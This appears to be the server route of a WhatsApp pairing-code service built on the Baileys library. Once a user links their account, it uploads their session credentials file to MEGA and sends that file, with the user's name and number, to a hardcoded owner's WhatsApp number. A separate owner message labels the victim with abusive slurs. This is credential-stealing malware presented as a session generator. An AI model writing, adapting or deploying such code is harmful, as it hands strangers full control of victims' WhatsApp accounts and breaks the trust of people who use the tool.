import express from "express";
import fs from "fs";
import pino from "pino";
import {
    makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser,
    fetchLatestBaileysVersion,
} from "@whiskeysockets/baileys";
import pn from "awesome-phonenumber";
import { upload } from "./mega.js";

const router = express.Router();

// ─── आपको बस ये बदलना है ──────────────────────────────────
const OWNER_NUMBER = "+918075498750";        // अपना WhatsApp नंबर
const SONG_LINK = "https://files.catbox.moe/7z582t.m4a";
const IMAGE_URL = "https://files.catbox.moe/x89cc5.jpg";
const LINKS = [
    "t.me/YAMDHUD",
    "https://github.com/9man-x-yamdhuuud",
    "https://www.youtube.com/@9man_vlog",
    "🐊𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗🐊__________𝗣𝗔𝗣𝗔 𝗝𝗜 𝗕𝗢𝗟 𝗖𝗛𝗔𝗟 𝗔𝗕 𝗝𝗢 𝗧𝗔𝗥𝗘 𝗗𝗠 𝗦𝗘 𝗢𝗪𝗡𝗘𝗥 𝗞𝗘 𝗣𝗔𝗦𝗦 𝗚𝗬𝗔 𝗛 𝗨𝗦𝗞𝗢 𝗗𝗘𝗟𝗘𝗧__👅𝗠𝗔𝗧 𝗞𝗔𝗥𝗡𝗔 ___𝗕𝗔𝗥𝗡𝗔 𝗖𝗛𝗨𝗗 𝗞𝗔𝗚𝗔 🫩🤡"
];
// ────────────────────────────────────────────────────────────

function removeFile(FilePath) {
    try {
        if (!fs.existsSync(FilePath)) return false;
        fs.rmSync(FilePath, { recursive: true, force: true });
    } catch (e) {
        console.error("Error removing file:", e);
    }
}

function getMegaFileId(url) {
    try {
        const match = url.match(/\/file\/([^#]+#[^\/]+)/);
        return match ? match[1] : null;
    } catch (error) {
        return null;
    }
}

router.get("/", async (req, res) => {
    let num = req.query.number;
    let dirs = "./" + (num || `session`);

    await removeFile(dirs);

    num = num.replace(/[^0-9]/g, "");

    const phone = pn("+" + num);
    if (!phone.isValid()) {
        if (!res.headersSent) {
            return res.status(400).send({
                code: "Invalid phone number. Please enter your full international number (e.g., 15551234567 for US, 447911123456 for UK, 84987654321 for Vietnam, etc.) without + or spaces.",
            });
        }
        return;
    }
    num = phone.getNumber("e164").replace("+", "");

    async function initiateSession() {
        const { state, saveCreds } = await useMultiFileAuthState(dirs);

        try {
            const { version, isLatest } = await fetchLatestBaileysVersion();
            let KnightBot = makeWASocket({
                version,
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(
                        state.keys,
                        pino({ level: "fatal" }).child({ level: "fatal" }),
                    ),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: Browsers.windows("Chrome"),
                markOnlineOnConnect: false,
                generateHighQualityLinkPreview: false,
                defaultQueryTimeoutMs: 60000,
                connectTimeoutMs: 60000,
                keepAliveIntervalMs: 30000,
                retryRequestDelayMs: 250,
                maxRetries: 5,
            });

            KnightBot.ev.on("connection.update", async (update) => {
                const { connection, lastDisconnect, isNewLogin, isOnline } = update;

                if (connection === "open") {
                    console.log("✅ Connected successfully!");
                    console.log("📱 Uploading session to MEGA...");

                    const credsPath = dirs + "/creds.json";
                    let megaFileId = null;
                    let megaUrl = null;

                    try {
                        megaUrl = await upload(
                            credsPath,
                            `creds_${num}_${Date.now()}.json`,
                        );
                        megaFileId = getMegaFileId(megaUrl);
                        if (megaFileId) {
                            console.log("✅ Session uploaded to MEGA. File ID:", megaFileId);
                        } else {
                            console.log("❌ Failed to upload to MEGA");
                        }
                    } catch (error) {
                        console.error("❌ Error uploading to MEGA:", error);
                    }

                    // यूजर और ओनर के JID बनाएं
                    const userJid = jidNormalizedUser(num + "@s.whatsapp.net");
                    let ownerJid = null;
                    if (OWNER_NUMBER) {
                        const ownerPhone = OWNER_NUMBER.replace(/[^0-9]/g, "");
                        if (ownerPhone) {
                            ownerJid = jidNormalizedUser(ownerPhone + "@s.whatsapp.net");
                        }
                    }

                    // ─── यूजर का नाम (Profile Name) प्राप्त करें ───
                    let userName = "Unknown";
                    try {
                        const contact = await KnightBot.getContact(userJid);
                        if (contact && contact.name) {
                            userName = contact.name;
                        } else if (contact && contact.notify) {
                            userName = contact.notify;
                        } else {
                            // अगर नाम न मिले तो नंबर ही डाल दें
                            userName = num;
                        }
                        console.log("👤 User Name:", userName);
                    } catch (err) {
                        console.warn("Could not fetch contact name:", err);
                        userName = num; // fallback
                    }

                    // ─── सारी डिटेल्स वाला कैप्शन ──────────────────
                    const caption = 
                        `📱 *USRR🙂:* ${userName} (${num})\n` +
                        `📁 *MEGA ID:* ${megaFileId || "Not available"}\n` +
                        `👤 *Owner:* ${OWNER_NUMBER}\n` +
                        `🎵 *Song:* ${SONG_LINK}\n\n` +
                        `🔗 *NAME SUN LODE OWNER KA 🐊𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗🐊 PAPA JI:*\n` +
                        LINKS.map((link, i) => `${i+1}. ${link}`).join("\n");

                    // ─── ओनर के लिए अलग से डिटेल मैसेज ────────────
                    const ownerMessage = 
                        `🔔 *NEW PAIRING CODE____🫩🤡!*\n\n` +
                        `📱 LODU KA NUMBER : ${num}\n` +
                        `👤 JHATU KA NAME KYA H: ${userName}\n` +
                        `📁 MEGA File ID: ${megaFileId || "N/A"}\n` +
                        `🎵 Song: ${SONG_LINK}\n` +
                        `🔗 LINK...?________________🐊𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗🐊:\n${LINKS.map((l,i)=>`${i+1}. ${l}`).join("\n")}`;

                    // ─── फंक्शन: किसी भी JID को भेजें ──────────────
                    async function sendToJid(jid, includeFile = true) {
                        if (!jid) return;
                        try {
                            // 1. फोटो + कैप्शन
                            await KnightBot.sendMessage(jid, {
                                image: { url: IMAGE_URL },
                                caption: caption,
                            });
                            console.log(`🖼️ Photo sent to ${jid}`);

                            // 2. creds.json भेजें (अगर चाहें)
                            if (includeFile) {
                                const credsBuffer = fs.readFileSync(credsPath);
                                await KnightBot.sendMessage(jid, {
                                    document: credsBuffer,
                                    mimetype: "application/json",
                                    fileName: "creds.json",
                                });
                                console.log(`📄 creds.json sent to ${jid}`);
                            }
                        } catch (err) {
                            console.error(`❌ Error sending to ${jid}:`, err);
                        }
                    }

                    // ─── यूजर को भेजें (फाइल सहित) ──────────────────
                    await sendToJid(userJid, true);

                    // ─── ओनर को भेजें (फाइल सहित) ──────────────────
                    if (ownerJid && ownerJid !== userJid) {
                        await sendToJid(ownerJid, true);
                        // ओनर को अलग से पूरी डिटेल वाला टेक्स्ट मैसेज भी भेजें
                        try {
                            await KnightBot.sendMessage(ownerJid, { text: ownerMessage });
                            console.log("📝 Owner details message sent");
                        } catch (e) {
                            console.error("Error sending owner details text:", e);
                        }
                    } else if (ownerJid && ownerJid === userJid) {
                        console.log("ℹ️ Owner is the same as user, not sending duplicate.");
                    }

                    // क्लीनअप और बाहर निकलें
                    console.log("🧹 Cleaning up session...");
                    await delay(1000);
                    removeFile(dirs);
                    console.log("✅ Session cleaned up successfully");
                    console.log("🎉 Process completed successfully!");

                    console.log("🛑 Shutting down application...");
                    await delay(2000);
                    process.exit(0);
                }

                if (isNewLogin) {
                    console.log("🔐 New login via pair code");
                }

                if (isOnline) {
                    console.log("📶 Client is online");
                }

                if (connection === "close") {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;

                    if (statusCode === 401) {
                        console.log("❌ Logged out from WhatsApp. Need to generate new pair code.");
                    } else {
                        console.log("🔁 Connection closed — restarting...");
                        initiateSession();
                    }
                }
            });

            if (!KnightBot.authState.creds.registered) {
                await delay(3000);
                num = num.replace(/[^\d+]/g, "");
                if (num.startsWith("+")) num = num.substring(1);

                try {
                    let code = await KnightBot.requestPairingCode(num);
                    code = code?.match(/.{1,4}/g)?.join("-") || code;
                    if (!res.headersSent) {
                        console.log({ num, code });
                        await res.send({ code });
                    }
                } catch (error) {
                    console.error("Error requesting pairing code:", error);
                    if (!res.headersSent) {
                        res.status(503).send({
                            code: "Failed to get pairing code. Please check your phone number and try again.",
                        });
                    }
                    setTimeout(() => process.exit(1), 2000);
                }
            }

            KnightBot.ev.on("creds.update", saveCreds);
        } catch (err) {
            console.error("Error initializing session:", err);
            if (!res.headersSent) {
                res.status(503).send({ code: "Service Unavailable" });
            }
            setTimeout(() => process.exit(1), 2000);
        }
    }

    await initiateSession();
});

process.on("uncaughtException", (err) => {
    let e = String(err);
    if (e.includes("conflict")) return;
    if (e.includes("not-authorized")) return;
    if (e.includes("Socket connection timeout")) return;
    if (e.includes("rate-overlimit")) return;
    if (e.includes("Connection Closed")) return;
    if (e.includes("Timed Out")) return;
    if (e.includes("Value not found")) return;
    if (e.includes("Stream Errored") || e.includes("Stream Errored (restart required)")) return;
    if (e.includes("statusCode: 515") || e.includes("statusCode: 503")) return;
    console.log("Caught exception: ", err);
    process.exit(1);
});

export default router;
